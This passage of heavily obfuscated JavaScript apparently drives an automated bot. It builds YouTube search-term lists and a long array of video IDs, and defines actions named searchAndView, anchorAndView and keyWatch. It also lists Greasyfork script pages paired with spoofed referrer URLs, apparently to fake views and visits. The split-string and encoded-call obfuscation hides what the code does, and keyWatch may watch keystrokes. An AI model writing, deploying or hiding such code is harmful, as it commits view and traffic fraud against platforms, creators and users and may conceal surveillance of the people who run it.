'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1b60 + 0x5d * -0x56 + 0x64 * 0xa)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x1 * 0x3eb + 0xb6b + -0x776)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')[Z(0x13, 'QHza')](',')), searchTerms = searchTerms['flat'](0xf51 * -0x2 + -0x1944 + -0x44d * -0xd);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    Y(0xc) + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    Z(0xf, '7n0v') + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    Z(0xb, 'D4Gz') + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    Y(0x4) + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + Z(0x14, 'wWup') + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x2) + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
